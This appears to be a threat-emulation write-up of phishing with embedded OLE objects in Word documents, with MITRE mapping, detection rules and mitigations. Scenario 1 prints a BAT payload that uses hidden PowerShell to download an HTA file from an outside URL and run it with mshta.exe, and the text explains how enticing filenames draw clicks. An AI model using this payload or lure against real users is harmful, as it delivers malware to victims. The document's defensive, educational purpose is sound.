# Embedding Object in Office Document

## Overview

Microsoft Office applications (Word, Excel) support OLE (Object Linking and Embedding), which allows arbitrary files to be embedded inside a document. When the victim double-clicks the embedded object icon, the associated application executes the embedded file — which can be a `.bat`, `.exe`, `.lnk`, or any other executable format.

## How it Works

An attacker embeds a malicious file (e.g., a `.bat` script or `.lnk` shortcut) inside a Word document disguised as a legitimate icon (PDF, image, etc.). The victim receives the document, sees what appears to be an attachment inside the email body, and double-clicks it to open it — triggering execution of the embedded payload.

---

## Scenario 1 – Embedded BAT File

**Files:** `Confidential.docx`, `Important document.bat`

The document `Confidential.docx` contains an embedded OLE object that, when double-clicked, extracts and executes `Important document.bat`.

**BAT payload content:**

```bat
@echo off
powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('https://files.fm/down.php?i=bbvvssnu', 'c:/windows/temp/calc.hta'); mshta.exe c:/windows/temp/calc.hta
```

This uses a hidden PowerShell window to download an HTA file and execute it with `mshta.exe`.

**PoC BAT (harmless calc.exe version):**

```bat
@echo off
calc.exe
```

---

## Scenario 2 – Embedded LNK Shortcut

**Files:** `KPI.docx`, `kpi_calculator.com.lnk`

The document `KPI.docx` contains an embedded OLE object that launches `kpi_calculator.com.lnk`. The `.lnk` shortcut is disguised as a calculator utility but executes a malicious command via its `Target` field.

**PoC LNK target (harmless):**

```
C:\Windows\System32\calc.exe
```

---

## Social Engineering Context

Both scenarios use business-relevant filenames (`Confidential`, `KPI`) to motivate victims to interact with the embedded content. The documents appear to contain a sub-attachment, exploiting the common user behavior of clicking embedded items in emails.

## MITRE ATT&CK

| Field | Value |
|---|---|
| Technique | T1566.001 – Spear Phishing Attachment |
| Sub-technique | T1204.002 – User Execution: Malicious File |
| Tactic | Initial Access, Execution |
| Platform | Windows |

## Detection

- Monitor Office applications (`WINWORD.EXE`, `EXCEL.EXE`) spawning `cmd.exe`, `powershell.exe`, or `mshta.exe`.
- Alert on embedded OLE objects with executable content types in Office documents.
- Inspect email gateway for `.docx` files with embedded objects.

## Mitigation

- Enable Protected View and disable automatic OLE object execution.
- Block or sandbox Office files from the internet via Group Policy.
- Deploy endpoint detection rules for Office spawning shell interpreters.
